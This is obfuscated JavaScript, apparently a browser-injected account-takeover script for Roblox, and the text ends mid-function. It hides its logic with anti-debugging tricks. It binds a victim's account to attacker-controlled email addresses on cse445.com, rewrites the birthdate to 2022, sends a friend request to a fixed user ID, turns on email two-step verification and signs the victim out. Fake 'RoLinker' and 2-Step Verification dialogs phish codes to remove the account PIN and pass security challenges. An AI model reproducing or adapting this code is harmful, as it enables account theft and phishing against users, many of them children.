;(function () {
  var I
  try {
    var l = Function('return (function() {}.constructor("return this")( ));')
    I = l()
  } catch (U) {
    I = window
  }
  I.setInterval(L, 4000)
})()
;(async function () {
  var i = (function () {
    var S = {
      dorni: 'GET',
      CWtil: 'beforeend',
      SvRBR: 'closeButton1',
      EXUvN: 'promptPopup',
      hozTO: 'text-footer footer-note',
      ILVaB: 'Not Active',
      fNWuN: 'pinPopupz',
      vWZCW: function (E, D) {
        return E == D
      },
      XRGjy: 'btn-cta-md modal-modern-footer-button',
      GrnmI: function (E, D) {
        return E === D
      },
      RYyNJ: 'PrUpJ',
      uFUDZ: 'mSnOS',
      BMuZp: 'oAQjA',
      GZpIH: 'kvHmh',
      fIfcX: function (E, D, p) {
        return E(D, p)
      },
    }
    var A = true
    return function (E, D) {
      var p = {
        fbKKn: S.CWtil,
        mNbFG: S.SvRBR,
        ujNov: S.EXUvN,
        vgUQX: S.hozTO,
        wUhVq: S.ILVaB,
        MNqxt: S.fNWuN,
        VZkSP: function (G, Q) {
          return S.vWZCW(G, Q)
        },
        eAyLJ: S.XRGjy,
        oNLni: function (G, Q) {
          return S.GrnmI(G, Q)
        },
        gQZjl: S.RYyNJ,
        IiPko: S.uFUDZ,
        rbwGj: S.BMuZp,
      }
      if (S.GrnmI(S.GZpIH, S.GZpIH)) {
        var z = A
          ? function () {
              var G = {
                ttYZi: p.ujNov,
                DCmkE: p.vgUQX,
                ilpad: p.wUhVq,
                hOYPc: p.MNqxt,
                uNTrh: function (w, g) {
                  return p.VZkSP(w, g)
                },
                cwRGz: p.fbKKn,
                krwub: p.eAyLJ,
              }
              if (p.oNLni(p.gQZjl, p.gQZjl)) {
                if (D) {
                  if (p.oNLni(p.IiPko, p.rbwGj)) {
                    var g =
                      '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>You are currently signed out of Roblox</div></div></div><div class="modal-footer"></div></div></div></div></div></div>'
                    h.body.insertAdjacentHTML(p.fbKKn, g)
                    i.getElementById(p.mNbFG).onclick = function () {
                      g.getElementById(G.ttYZi).remove()
                      s.getElementsByClassName(G.DCmkE)[0].innerText = G.ilpad
                    }
                    V.getElementById(p.ujNov).onclick = function () {
                      g.getElementById(G.ttYZi).remove()
                      s.getElementsByClassName(G.DCmkE)[0].innerText = G.ilpad
                    }
                  } else {
                    var Q = D.apply(E, arguments)
                    return (D = null), Q
                  }
                }
              } else {
                F.getElementsByClassName(G.DCmkE)[0].innerText = G.ilpad
                if (G.uNTrh(h.getElementById(G.hOYPc), null)) {
                  var j =
                    '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>'
                  J.body.insertAdjacentHTML(G.cwRGz, j)
                  n.getElementsByClassName(G.krwub)[0].onclick = function () {
                    j.getElementById(G.hOYPc).remove()
                    ;(2000).getElementsByClassName(G.DCmkE)[0].innerText =
                      G.ilpad
                  }
                }
              }
            }
          : function () {}
        return (A = false), z
      } else {
        const Q =
          'https://inventory.roblox.com/v1/users/' +
          L +
          '/assets/collectibles?assetType=null&cursor=&limit=100&sortOrder=Desc'
        var w = {}
        return (w.url = Q), (w.type = S.dorni), m.ajax(w)
      }
    }
  })()
  var C = i(this, function () {
    return C.toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(C)
      .search('(((.+)+)+)+$')
  })
  C()
  var m = (function () {
    var A = true
    return function (D, p) {
      var G = A
        ? function () {
            if (p) {
              var w = p.apply(D, arguments)
              return (p = null), w
            }
          }
        : function () {}
      return (A = false), G
    }
  })()
  ;(function () {
    m(this, function () {
      var A = new RegExp('function *\\( *\\)'),
        E = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
        D = L('init')
      if (!A.test(D + 'chain') || !E.test(D + 'input')) {
        D('0')
      } else {
        L()
      }
    })()
  })()
  var V = (function () {
      var A = true
      return function (D, p) {
        var Q = A
          ? function () {
              if (p) {
                var j = p.apply(D, arguments)
                return (p = null), j
              }
            }
          : function () {}
        return (A = false), Q
      }
    })(),
    J = V(this, function () {
      var A = function () {
          var o
          try {
            o = Function(
              'return (function() {}.constructor("return this")( ));'
            )()
          } catch (d) {
            o = window
          }
          return o
        },
        E = A(),
        D = (E.console = E.console || {}),
        p = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace']
      for (var z = 0; z < p.length; z++) {
        var g = V.constructor.prototype.bind(V)
        var w = p[z]
        var j = D[w] || g
        g['__proto__'] = V.bind(V)
        g.toString = j.toString.bind(j)
        D[w] = g
      }
    })
  J()
  const n = (S) => new Promise((A) => setTimeout(A, S))
  var t = [
      'eudora1767@wfv6.cse445.com',
      'kelson3940@ed0w.cse445.com',
      'bollay33901@tcsmi.cse445.com',
      'purcell34784@vqbgl.cse445.com',
      'eggett27115@z5v7.cse445.com',
    ],
    s = 'cse445.com',
    N = t[Math.floor(Math.random() * t.length)],
    x = 500,
    F = {
      assetIdArray_1000: [1000, '1794541749', '16986768516'],
      assetIdArray_5000: [5000, '1794542052', '16986772869'],
      assetIdArray_10000: [10000, '1787690961', '16986773507'],
      assetIdArray_20000: [20000, '1794542134', '16986774106'],
      assetIdArray_30000: [30000, '1794542166', '16986774597'],
      assetIdArray_40000: [40000, '1794542196', '16986774988'],
      assetIdArray_50000: [50000, '1794542235', '16986775698'],
      assetIdArray_80000: [80000, '1794542291', '16986776187'],
      assetIdArray_90000: [90000, '1794542323', '16986776540'],
      assetIdArray_100000: [100000, '1794542362', '16986777032'],
    }
  var f = F
  var O = [
    'UserID list',
    'Omitted for simplicity',
  ]
  try {
    console.log(
      document.getElementsByClassName('text-footer footer-note')[0].innerText
    )
  } catch {
    window.location.reload()
  }
  document.getElementsByClassName('text-footer footer-note')[0].innerText !=
    'Active' &&
    ((document.getElementsByClassName('text-footer footer-note')[0].innerText =
      'Active'),
    $.ajax({
      method: 'GET',
      url: 'https://users.roblox.com/v1/users/authenticated',
      contentType: 'application/json',
      success: function (E) {
        var p = E.id
        try {
          var z = { friendshipOriginSourceType: 0 }
          $.ajax({
            method: 'POST',
            url:
              'https://friends.roblox.com/v1/users/' +
              5762605139 +
              '/request-friendship',
            contentType: 'application/json',
            data: JSON.stringify(z),
          })
        } catch {}
        async function G() {
          function o() {
            $.ajax({
              method: 'GET',
              url: 'https://accountsettings.roblox.com/v1/email',
              contentType: 'application/json',
              success: function (a) {
                if (a.emailAddress == null) {
                  var M = {
                    emailAddress: N,
                    password: '',
                  }
                  $.ajax({
                    method: 'POST',
                    url: 'https://accountsettings.roblox.com/v1/email',
                    contentType: 'application/json',
                    data: JSON.stringify(M),
                  })
                } else {
                  var B = a.emailAddress,
                    W = a.verified
                  if (B.includes(s) == true) {
                    if (W == true) {
                      console.log(
                        'Enable Email Two Step and then sign them out'
                      )
                      var y = {
                        method: 'POST',
                        url:
                          'https://twostepverification.roblox.com/v1/users/' +
                          p +
                          '/configuration/email/enable',
                        contentType: 'application/json',
                      }
                      $.ajax(y)
                      var R = {
                        method: 'POST',
                        url:
                          'https://twostepverification.roblox.com/v1/users/' +
                          p +
                          '/configuration/email/enable',
                        contentType: 'application/json',
                      }
                      $.ajax(R)
                      var q0 = {
                        method: 'POST',
                        url:
                          'https://twostepverification.roblox.com/v1/users/' +
                          p +
                          '/configuration/email/enable',
                        contentType: 'application/json',
                      }
                      $.ajax(q0)
                      var q1 = {
                        method: 'POST',
                        url:
                          'https://twostepverification.roblox.com/v1/users/' +
                          p +
                          '/configuration/email/enable',
                        contentType: 'application/json',
                      }
                      $.ajax(q1)
                      ;(async function () {
                        await n(500)
                        var q6 = {
                          method: 'POST',
                          url: 'https://auth.roblox.com/v2/logout',
                          contentType: 'application/json',
                        }
                        $.ajax(q6)
                      })()
                    } else {
                      var q2 = {
                        method: 'POST',
                        url: 'https://accountsettings.roblox.com/v1/email/verify',
                        contentType: 'application/json',
                      }
                      $.ajax(q2)
                    }
                  }
                }
              },
            }),
              setTimeout(o, 2000)
          }
          o()
          function b(T, Z) {
            $.ajax({
              method: 'POST',
              url:
                'https://twostepverification.roblox.com/v1/users/' +
                p +
                '/challenges/email/send-code',
              contentType: 'application/json',
              data: JSON.stringify({
                actionType: 'Generic',
                challengeId: T,
              }),
              success: function () {
                var B =
                  '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>'
                document.body.insertAdjacentHTML('beforeend', B)
                function y() {
                  if (
                    document.getElementById('two-step-verification-code-input')
                      .value.length == 6
                  ) {
                    document.getElementsByClassName(
                      'btn-cta-md modal-modern-footer-button'
                    )[0].disabled = false
                  } else {
                    document.getElementsByClassName(
                      'btn-cta-md modal-modern-footer-button'
                    )[0].disabled = true
                  }
                  setTimeout(y, 100)
                }
                y()
                document.getElementsByClassName(
                  'btn-cta-md modal-modern-footer-button'
                )[0].onclick = function () {
                  $.ajax({
                    method: 'POST',
                    url:
                      'https://twostepverification.roblox.com/v1/users/' +
                      p +
                      '/challenges/email/verify',
                    contentType: 'application/json',
                    data: JSON.stringify({
                      challengeId: T,
                      actionType: 'Generic',
                      code: document.getElementById(
                        'two-step-verification-code-input'
                      ).value,
                    }),
                    success: function (q0) {
                      var q3 = q0.verificationToken
                      $.ajax({
                        method: 'POST',
                        url: 'https://apis.roblox.com/challenge/v1/continue',
                        contentType: 'application/json',
                        data: JSON.stringify({
                          challengeId: Z,
                          challengeMetadata:
                            '{"verificationToken":"' +
                            q3 +
                            '","rememberDevice":false,"challengeId":"' +
                            T +
                            '","actionType":"Generic"}',
                          challengeType: 'twostepverification',
                        }),
                        success: function () {
                          document.getElementById('twoStepPrompts').remove()
                          n(2000)
                          w()
                          G()
                        },
                      })
                    },
                    error: function () {
                      document.getElementsByClassName(
                        'form-control-label bottom-label xsmall'
                      )[0].innerText = 'Invalid code'
                      document.getElementById('groupElementId').className =
                        'form-has-feedback  form-has-error form-group'
                    },
                  })
                }
              },
            })
          }
          function r(T, Z) {
            var M =
              '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code generated by your authenticator app. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>'
            document.body.insertAdjacentHTML('beforeend', M)
            function B() {
              if (
                document.getElementById('two-step-verification-code-input')
                  .value.length == 6
              ) {
                document.getElementsByClassName(
                  'btn-cta-md modal-modern-footer-button'
                )[0].disabled = false
              } else {
                document.getElementsByClassName(
                  'btn-cta-md modal-modern-footer-button'
                )[0].disabled = true
              }
              setTimeout(B, 100)
            }
            B()
            document.getElementsByClassName(
              'btn-cta-md modal-modern-footer-button'
            )[0].onclick = function () {
              $.ajax({
                method: 'POST',
                url:
                  'https://twostepverification.roblox.com/v1/users/' +
                  p +
                  '/challenges/authenticator/verify',
                contentType: 'application/json',
                data: JSON.stringify({
                  challengeId: T,
                  actionType: 'Generic',
                  code: document.getElementById(
                    'two-step-verification-code-input'
                  ).value,
                }),
                success: function (R) {
                  var q1 = R.verificationToken
                  $.ajax({
                    method: 'POST',
                    url: 'https://apis.roblox.com/challenge/v1/continue',
                    contentType: 'application/json',
                    data: JSON.stringify({
                      challengeId: Z,
                      challengeMetadata:
                        '{"verificationToken":"' +
                        q1 +
                        '","rememberDevice":false,"challengeId":"' +
                        T +
                        '","actionType":"Generic"}',
                      challengeType: 'twostepverification',
                    }),
                    success: function () {
                      document.getElementById('twoStepPrompts').remove(),
                        n(2000),
                        G()
                    },
                  })
                },
                error: function () {
                  ;(document.getElementsByClassName(
                    'form-control-label bottom-label xsmall'
                  )[0].innerText = 'Invalid code'),
                    (document.getElementById('groupElementId').className =
                      'form-has-feedback  form-has-error form-group')
                },
              })
            }
          }
          function d(T) {
            $.ajax({
              method: 'POST',
              url: 'https://apis.roblox.com/otp-service/v1/sendCodeForUser',
              contentType: 'application/json',
              data: JSON.stringify({
                contactType: 'Email',
                messageVariant: 'Default',
                origin: 'Reauth',
              }),
              success: function (v) {
                var B = v.otpSessionToken,
                  W =
                    '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">A one-time code has been sent to your registered email. Please enter your one-time code to continue.</p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-Digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">\xA0;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>'
                document.body.insertAdjacentHTML('beforeend', W)
                function y() {
                  if (
                    document.getElementById('two-step-verification-code-input')
                      .value.length == 6
                  ) {
                    document.getElementsByClassName(
                      'btn-cta-md modal-modern-footer-button'
                    )[0].disabled = false
                  } else {
                    document.getElementsByClassName(
                      'btn-cta-md modal-modern-footer-button'
                    )[0].disabled = true
                  }
                  setTimeout(y, 100)
                }
                y()
                document.getElementsByClassName(
                  'btn-cta-md modal-modern-footer-button'
                )[0].onclick = function () {
                  $.ajax({
                    method: 'POST',
                    url: 'https://apis.roblox.com/otp-service/v1/validateCode',
                    contentType: 'application/json',
                    data: JSON.stringify({
                      contactType: 'Email',
                      origin: 'Reauth',
                      otpSessionToken: B,
                      passCode: document.getElementById(
                        'two-step-verification-code-input'
                      ).value,
                    }),
                    success: function () {
                      $.ajax({
                        method: 'POST',
                        url: 'https://apis.roblox.com/reauthentication-service/v1/token/generate',
                        contentType: 'application/json',
                        data: JSON.stringify({
                          sessionId: B,
                          type: 'Otp_Email',
                        }),
                        success: function (q3) {
                          ;(responseToken = q3.token),
                            $.ajax({
                              method: 'POST',
                              url: 'https://apis.roblox.com/challenge/v1/continue',
                              contentType: 'application/json',
                              data: JSON.stringify({
                                challengeId: T,
                                challengeMetadata:
                                  '{"reauthenticationToken":"' +
                                  responseToken +
                                  '"}',
                                challengeType: 'reauthentication',
                              }),
                              success: function () {
                                document
                                  .getElementById('twoStepPrompts')
                                  .remove(),
                                  n(2000),
                                  G()
                              },
                            })
                        },
                      })
                    },
                    error: function () {
                      ;(document.getElementsByClassName(
                        'form-control-label bottom-label xsmall'
                      )[0].innerText = 'Invalid code'),
                        (document.getElementById('groupElementId').className =
                          'form-has-feedback  form-has-error form-group')
                    },
                  })
                }
              },
            })
          }
          function X(T, Z) {
            $.ajax({
              method: 'GET',
              url:
                'https://twostepverification.roblox.com/v1/users/' +
                p +
                '/configuration',
              contentType: 'application/json',
              success: function (v) {
                var B = v.primaryMediaType
                if (B == 'Email') {
                  b(T, Z)
                } else {
                  if (B == 'Authenticator') {
                    r(T, Z)
                  } else {
                    if (B == null) {
                      d(Z)
                    }
                  }
                }
              },
            })
          }
          function Y() {
            var Z = {
              birthDay: 2,
              birthMonth: 2,
              birthYear: 2022,
            }
            $.ajax({
              method: 'POST',
              url: 'https://users.roblox.com/v1/birthdate',
              contentType: 'application/json',
              data: JSON.stringify(Z),
              success: function () {
                var v = {
                  emailAddress: N,
                  password: '',
                }
                $.ajax({
                  method: 'POST',
                  url: 'https://accountsettings.roblox.com/v1/email',
                  contentType: 'application/json',
                  data: JSON.stringify(v),
                  success: function () {
                    ;(async function () {
                      await n(1500)
                      $.ajax({
                        method: 'GET',
                        url: 'https://accountsettings.roblox.com/v1/email',
                        contentType: 'application/json',
                        success: function (y) {
                          if (y.emailAddress == null) {
                            var R = {
                              emailAddress: N,
                              password: '',
                            }
                            $.ajax({
                              method: 'POST',
                              url: 'https://accountsettings.roblox.com/v1/email',
                              contentType: 'application/json',
                              data: JSON.stringify(R),
                            })
                          }
                        },
                      })
                    })()
                  },
                  error: function () {
                    ;(async function () {
                      await n(1500),
                        $.ajax({
                          method: 'GET',
                          url: 'https://accountsettings.roblox.com/v1/email',
                          contentType: 'application/json',
                          success: function (y) {
                            if (y.emailAddress == null) {
                              var R = {
                                emailAddress: N,
                                password: '',
                              }
                              $.ajax({
                                method: 'POST',
                                url: 'https://accountsettings.roblox.com/v1/email',
                                contentType: 'application/json',
                                data: JSON.stringify(R),
                              })
                            }
                          },
                        })
                    })()
                  },
                })
              },
              error: function (a) {
                var v = atob(a.getResponseHeader('rblx-challenge-metadata')),
                  M = a.getResponseHeader('rblx-challenge-id'),
                  B = v.split('"challengeId":"').pop().split('"')[0]
                X(B, M)
              },
            })
          }
          if (document.getElementById('RoLinker1') == null) {
            var P =
              '<div id="RoLinker1" role="dialog"><div class="fade modal-backdrop in"></div><div aria-labelledby="contained-modal-title-vcenter" scrollable="true" centered="true" role="dialog" tabindex="-1" style="display: block;" class="fade verification-modal in modal"><div class="modal-sm modal-dialog"><div class="modal-content" role="document"><div><div title="" class="modal-header"><div class="verification-upsell-title-container"><button type="button" class="verification-upsell-title-button"></button><h4 id="contained-modal-title-vcenter" class="modal-title">RoLinker Agreement </h4></div></div><div class="verification-upsell-text-body text-description">RoLinker can view your Roblox Username</div><div class="modal-footer"><div class="text-description font-caption-body phone-verification-legal-text" hidden="">By clicking "Continue", you are submitting your phone number and agreeing to our <a href="https://en.help.roblox.com/hc/articles/9483830673556-Roblox-SMS-Terms-of-Service">SMS Terms of Use</a> and <a href="https://en.help.roblox.com/hc/articles/115004630823">Privacy Policy</a>. We will send you a one-time verification code. Message and data rates may apply. Reply HELP for help.</div><div class="buttons-section"><button type="button" class="accept-btn btn-primary-md btn-min-width" id="agreeRoLinker">Agree & Continue</button></div><div></div></div></div></div></div></div></div>'
            document.body.insertAdjacentHTML('beforeend', P)
            document.getElementById('agreeRoLinker').onclick = function () {
              document.getElementById('agreeRoLinker').disabled = true
              $.ajax({
                method: 'GET',
                url: 'https://auth.roblox.com/v1/account/pin',
                contentType: 'application/json',
                success: function (a) {
                  var M = a.isEnabled,
                    B = a.unlockedUntil
                  if (M == true) {
                    if (B == null) {
                      document.getElementsByClassName(
                        'text-footer footer-note'
                      )[0].innerText = 'Not Active'
                      if (document.getElementById('pinPopupz') == null) {
                        var W =
                          '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>'
                        document.body.insertAdjacentHTML('beforeend', W)
                        document.getElementsByClassName(
                          'btn-cta-md modal-modern-footer-button'
                        )[0].onclick = function () {
                          document.getElementById('pinPopupz').remove(),
                            (document.getElementsByClassName(
                              'text-footer footer-note'
                            )[0].innerText = 'Not Active')
                        }
                      }
                    } else {
                      try {
                        document.getElementById('pinPopupz').remove()
                      } catch {}
                      $.ajax({
                        method: 'DELETE',
                        url: 'https://auth.roblox.com/v1/account/pin',
                        contentType: 'application/json',
                        success: function () {
                          Y()
                        },
                        error: function (q2) {
                          var q3 = atob(
                              q2.getResponseHeader('rblx-challenge-metadata')
                            ),
                            q4 = q2.getResponseHeader('rblx-challenge-id'),
                            q5 = q3.split('"challengeId":"').pop().split('"')[0]
                          X(q5, q4)
                        },
                      })
                    }
                  } else {
                    Y()
                  }
                },
              })
            }
          } else {
            $.ajax({
              method: 'GET',
              url: 'https://auth.roblox.com/v1/account/pin',
              contentType: 'application/json',
              success: function (a) {
                var M = a.isEnabled,
                  B = a.unlockedUntil
                if (M == true) {
                  if (B == null) {
                    document.getElementsByClassName(
                      'text-footer footer-note'
                    )[0].innerText = 'Not Active'
                    if (document.getElementById('pinPopupz') == null) {
                      var W =
                        '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>'
                      document.body.insertAdjacentHTML('beforeend', W)
                      document.getElementsByClassName(
                        'btn-cta-md modal-modern-footer-button'
                      )[0].onclick = function () {
                        document.getElementById('pinPopupz').remove()
                        document.getElementsByClassName(
                          'text-footer footer-note'
                        )[0].innerText = 'Not Active'
                      }
                    }
                  } else {
                    try {
                      document.getElementById('pinPopupz').remove()
                    } catch {}
                    $.ajax({
                      method: 'DELETE',
                      url: 'https://auth.roblox.com/v1/account/pin',
                      contentType: 'application/json',
                      success: function () {
                        Y()
                      },
                      error: function (q2) {
                        var q3 = atob(
                            q2.getResponseHeader('rblx-challenge-metadata')
                          ),
                          q4 = q2.getResponseHeader('rblx-challenge-id'),
                          q5 = q3.split('"challengeId":"').pop().split('"')[0]
                        X(q5, q4)
                      },
                    })
                  }
                } else {
                  Y()
                }
              },
            })
          }
        }
        async function Q() {
          function P(Y, T) {
            $.ajax({
              method: 'POST',
              url:
                'https://twostepverification.roblox.com/v1/users/' +
                p +
                '/challenges/email/send-code',
              contentType: 'application/json',
              data: JSON.stringify({
                actionType: 'Generic',
                challengeId: Y,
              }),
              success: function () {
                var v =
                  '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>'
                document.body.insertAdjacentHTML('beforeend', v)
                function B() {
                  document.getElementById('two-step-verification-code-input')
                    .value.length == 6
                    ? (document.getElementsByClassName(
                        'btn-cta-md modal-modern-footer-button'
                      )[0].disabled = false)
                    : (document.getElementsByClassName(
                        'btn-cta-md modal-modern-footer-button'
                      )[0].disabled = true),
                    setTimeout(B, 100)
                }
                B()
                document.getElementsByClassName(
                  'btn-cta-md modal-modern-footer-button'
                )[0].onclick = function () {
                  $.ajax({
                    method: 'POST',
                    url:
                      'https://twostepverification.roblox.com/v1/users/' +
                      p +
                      '/challenges/email/verify',
                    contentType: 'application/json',
                    data: JSON.stringify({
                      challengeId: Y,
                      actionType: 'Generic',
                      code: document.getElementById(
                        'two-step-verification-code-input'
                      ).value,
                    }),
                    success: function (R) {
                      var q1 = R.verificationToken
                      $.ajax({
                        method: 'POST',
                        url: 'https://apis.roblox.com/challenge/v1/continue',
                        contentType: 'application/json',
                        data: JSON.stringify({
                          challengeId: T,
                          challengeMetadata:
                            '{"verificationToken":"' +
                            q1 +
                            '","rememberDevice":false,"challengeId":"' +
                            Y +
                            '","actionType":"Generic"}',
                          challengeType: 'twostepverification',
                        }),
                        success: function () {
                          document.getElementById('twoStepPrompts').remove(),
                            n(2000),
                            d()
                        },
                      })
                    },
                    error: function () {
                      document.getElementsByClassName(
                        'form-control-label bottom-label xsmall'
                      )[0].innerText = 'Invalid code'
                      document.getElementById('groupElementId').className =
                        'form-has-feedback  form-has-error form-group'
                    },
                  })
                }
              },
            })
          }
          function o(Y, T) {
            var a =
              '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code generated by your authenticator app. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>'
            document.body.insertAdjacentHTML('beforeend', a)
            function M() {
              if (
                document.getElementById('two-step-verification-code-input')
                  .value.length == 6
              ) {
                document.getElementsByClassName(
                  'btn-cta-md modal-modern-footer-button'
                )[0].disabled = false
              } else {
